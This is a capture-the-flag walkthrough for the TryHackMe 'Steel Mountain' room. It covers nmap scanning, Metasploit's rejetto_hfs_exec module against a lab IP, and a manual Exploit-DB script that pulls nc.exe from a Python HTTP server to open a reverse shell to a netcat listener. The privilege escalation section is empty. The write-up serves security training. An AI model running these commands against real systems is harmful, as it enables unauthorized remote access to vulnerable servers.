# Steel Mountain

**Room Link:** [https://tryhackme.com/room/steelmountain](https://tryhackme.com/room/steelmountain)

## **Walkthrough**

**Introduction**

**Who is the employee of the month?**

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### **Initial Access**

**Scan the machine with nmap. What is the other port running a web server on?**

`nmap -A` 10.10.248.189

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

**Take a look at the other web server. What file server is running?**

Google this

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

**What is the CVE number to exploit this file server?**

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Use Metasploit to get an initial shell. What is the user flag?**

`msfconsole`&#x20;

`use exploit/windows/http/rejetto_hfs_exec`&#x20;

`set LHOST 10.10.62.157`&#x20;

`set RHOSTS 10.10.181.159`&#x20;

`set RPORT 8080`

**Option #2  Without Metasploit to get an initial shell. What is the user flag?**

**Exploit Link:** [https://www.exploit-db.com/raw/39161](https://www.exploit-db.com/raw/39161)

For this exploit we usually just need to change the ip\_addr and local\_port to our nc listener

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Because I performed this on a tryhackme attacker box which has port 80 in user to login through web I had to change the exploit to get the nc.exe from us on a different port.&#x20;

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

`nc -nvlp 443`

`cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/nc.exe .`

`python2 -m SimpleHTTPServer 81`

`python2 exploit.py 10.10.181.159 8080`

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

**Use Metasploit to get an initial shell. What is the user flag?**

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### Privilege Escalation

